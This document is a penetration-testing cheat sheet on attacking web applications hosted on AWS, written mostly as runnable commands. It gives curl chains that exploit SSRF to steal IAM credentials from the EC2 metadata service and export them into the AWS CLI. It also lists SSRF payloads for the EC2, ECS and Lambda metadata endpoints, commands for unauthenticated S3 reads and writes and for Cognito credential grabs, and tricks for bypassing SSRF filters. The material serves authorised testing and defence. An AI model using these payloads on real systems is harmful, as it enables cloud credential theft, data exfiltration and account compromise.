# AWS Web Attacks

> **Summary**: Exploitation of AWS-specific services and misconfigurations reachable through web application vulnerabilities.
> **Impact**: Credential theft, data exfiltration from S3/DynamoDB, lateral movement via IAM role assumption, full account compromise.
> **Typical Severity**: High | Critical

## Detection
### Indicators
- Application making calls to `169.254.169.254` or `fd00:ec2::254`
- AWS SDK errors leaking account IDs, region names, or role ARNs in responses
- S3 bucket names in HTML source, JavaScript files, or error messages
- Cognito Identity Pool IDs or User Pool IDs exposed in client-side code

### Automated Detection
```bash
# Enumerate S3 buckets from a target domain
cloud_enum -k <COMPANY_NAME> -l cloud_enum_results.txt

# Check for exposed AWS metadata via SSRF
curl -s http://<TARGET>/proxy?url=http://169.254.169.254/latest/meta-data/
```

### Manual Detection
1. Inspect JavaScript source for AWS SDK configuration (region, identity pool ID, API Gateway endpoints)
2. Check response headers for `x-amz-*` headers indicating S3 or CloudFront
3. Look for `s3.amazonaws.com` or `<BUCKET>.s3.<REGION>.amazonaws.com` patterns in page source
4. Test for SSRF endpoints that could reach the metadata service

## Exploitation
### Prerequisites
- Web application hosted on AWS (EC2, ECS, Lambda, Elastic Beanstalk)
- SSRF vulnerability or exposed AWS credentials/configuration
- For Cognito attacks: exposed Identity Pool ID or User Pool configuration

### Step-by-Step

#### 1. SSRF to EC2 Metadata (IMDSv1)

If the instance uses IMDSv1 (no token required):

```bash
# 1. Retrieve IAM role name
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Success: returns role name like "EC2-WebApp-Role"

# 2. Retrieve temporary credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
# Success: returns AccessKeyId, SecretAccessKey, Token

# 3. Retrieve other useful metadata
curl http://169.254.169.254/latest/meta-data/hostname
curl http://169.254.169.254/latest/meta-data/local-ipv4
curl http://169.254.169.254/latest/user-data
# user-data often contains startup scripts with hardcoded secrets
```

#### 2. SSRF to EC2 Metadata (IMDSv2)

IMDSv2 requires a PUT request to get a token first -- harder to exploit via SSRF but possible if the SSRF allows method control:

```bash
# 1. Get session token (requires PUT method)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# 2. Use token to query metadata
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
```

> IMDSv2 blocks most SSRF because typical SSRF proxies only support GET. If the SSRF allows full HTTP method control, IMDSv2 can still be bypassed.

#### 3. Using Stolen Credentials

```bash
# Configure AWS CLI with stolen creds
export AWS_ACCESS_KEY_ID=<STOLEN_KEY>
export AWS_SECRET_ACCESS_KEY=<STOLEN_SECRET>
export AWS_SESSION_TOKEN=<STOLEN_TOKEN>

# Identify who you are
aws sts get-caller-identity

# Enumerate permissions
aws iam list-attached-role-policies --role-name <ROLE_NAME>

# List S3 buckets
aws s3 ls

# Read DynamoDB tables
aws dynamodb list-tables --region <REGION>
```

#### 4. S3 Bucket Misconfiguration

```bash
# Check if bucket allows unauthenticated listing
aws s3 ls s3://<BUCKET_NAME> --no-sign-request

# Check if bucket allows unauthenticated read
aws s3 cp s3://<BUCKET_NAME>/<FILE> . --no-sign-request

# Check if bucket allows unauthenticated write
echo "test" > test.txt
aws s3 cp test.txt s3://<BUCKET_NAME>/test.txt --no-sign-request

# Brute-force bucket names
python3 cloud_enum.py -k <COMPANY_NAME>
```

#### 5. Cognito Identity Pool Exploitation

```bash
# If Identity Pool ID is exposed (e.g., us-east-1:xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx)
# Get temporary AWS credentials for unauthenticated users
aws cognito-identity get-id --identity-pool-id <POOL_ID> --region <REGION>
aws cognito-identity get-credentials-for-identity --identity-id <IDENTITY_ID> --region <REGION>

# If the unauthenticated role has overly permissive policies, escalate from here
```

#### 6. Lambda Function URL / API Gateway Abuse

```bash
# Lambda function URLs follow this pattern:
# https://<URL_ID>.lambda-url.<REGION>.on.aws/

# API Gateway endpoints:
# https://<API_ID>.execute-api.<REGION>.amazonaws.com/<STAGE>/

# Test for authorization bypass -- invoke without auth headers
curl -X POST https://<API_ID>.execute-api.<REGION>.amazonaws.com/prod/<ENDPOINT>
```

### Payloads

#### SSRF Metadata Payloads
```
# IPv4 metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document

# IPv6 metadata
http://[fd00:ec2::254]/latest/meta-data/

# DNS-based alternatives (useful for SSRF filters)
http://instance-data.ec2.internal/latest/meta-data/

# Container metadata (ECS)
http://169.254.170.2/v2/credentials/<GUID>

# Lambda environment
file:///proc/self/environ
# Or via runtime API:
http://localhost:9001/2018-06-01/runtime/invocation/next
```

### Proof of Concept

Minimal SSRF-to-credential-theft chain:
1. Find SSRF in `https://<TARGET>/api/fetch?url=`
2. Request `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
3. Retrieve role name from response
4. Request `http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>`
5. Extract `AccessKeyId`, `SecretAccessKey`, `Token`
6. Use `aws sts get-caller-identity` to confirm access

## Bypasses
- **IMDSv2 with header injection**: If the SSRF allows injecting headers, add `X-aws-ec2-metadata-token-ttl-seconds: 21600` via a PUT to `/latest/api/token`
- **DNS rebinding**: Resolve a domain to `169.254.169.254` after DNS validation passes
- **Redirect-based**: Use a controlled server that 302-redirects to `http://169.254.169.254/...`
- **IPv6 alternative**: Use `http://[fd00:ec2::254]/` when IPv4 is blocked
- **URL encoding**: Double-encode or use alternate IP representations (`http://2852039166/` for `169.254.169.254`)

## Escalation
- From IAM credentials: enumerate permissions, attempt privilege escalation via `iam:PassRole`, `sts:AssumeRole`, `lambda:CreateFunction`
- From S3 write access: overwrite application assets, inject JavaScript, modify Lambda deployment packages
- From Cognito: escalate to admin user pool access, modify user attributes
- Pivot to internal services using VPC-accessible endpoints
- Reference: [AWS Privilege Escalation Methods](https://dhiyaneshgeek.github.io/cloud/security/2022/06/23/aws-misconfigurations/)

## Tools
| Tool | Usage |
|------|-------|
| [cloud_enum](https://github.com/initstring/cloud_enum) | `cloud_enum -k <COMPANY>` -- Enumerate cloud resources across providers |
| [pacu](https://github.com/RhinoSecurityLabs/pacu) | AWS exploitation framework for post-compromise enumeration and escalation |
| [ScoutSuite](https://github.com/nccgroup/ScoutSuite) | Multi-cloud security auditing tool |
| [Bucket Decloaker](https://gist.github.com/fransr/a155e5bd7ab11c93923ec8ce788e3368) | Discover S3 buckets behind CloudFront |
| [s3scanner](https://github.com/sa7mon/S3Scanner) | Scan for open S3 buckets |
| [aws-cli](https://aws.amazon.com/cli/) | `aws sts get-caller-identity` -- Official AWS CLI for post-exploitation |
| [enumerate-iam](https://github.com/andresriancho/enumerate-iam) | Brute-force IAM permissions for a given set of credentials |
| [cloudfox](https://github.com/BishopFox/cloudfox) | Automating situational awareness for cloud penetration testing |

## References
- [Exploiting Weak Configurations in Amazon Cognito](https://blog.appsecco.com/exploiting-weak-configurations-in-amazon-cognito-in-aws-471ce761963)
- [AWS Misconfigurations -- Privilege Escalation](https://dhiyaneshgeek.github.io/cloud/security/2022/06/23/aws-misconfigurations/)
- [SSRF in AWS -- Capital One Breach Analysis](https://blog.appsecco.com/an-ssrf-privileged-aws-keys-and-the-capital-one-breach-4c3c2cded3af)
- [IMDSv1 vs IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- [Hacking the Cloud -- AWS](https://hackingthe.cloud/aws/general-knowledge/intro_metadata_service/)

**See also**: [SSRF](../vulns/ssrf.md) | [Subdomain Takeover](../vulns/subdomain-takeover.md)
